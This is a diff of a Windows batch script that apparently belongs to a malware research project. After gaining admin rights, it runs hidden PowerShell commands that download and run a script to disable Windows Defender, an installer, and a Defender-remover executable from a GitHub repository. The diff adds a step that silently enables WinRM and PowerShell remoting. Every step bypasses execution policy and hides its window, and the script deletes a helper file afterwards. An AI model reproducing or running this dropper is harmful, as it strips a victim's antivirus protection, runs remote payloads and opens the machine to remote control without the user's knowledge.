@@ -25,11 +25,14 @@ exit /B
 :gotAdmin
 cd /d "%~dp0"
 
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
+    "try { winrm quickconfig -quiet; Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop } catch { Write-Output 'WinRM already configured or failed'; Start-Sleep -Seconds 3 }"
+
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1' -OutFile disableWinDef.ps1"
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "disableWinDef.ps1"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/installer.ps1' -OutFile installer.ps1"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe' -OutFile defender_remover.exe"
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "installer.ps1"
+powershell -WindowStyle Hidden  -ExecutionPolicy Bypass -File "installer.ps1"
 @REM defender_remover.exe Y
 
 del wget.cmd
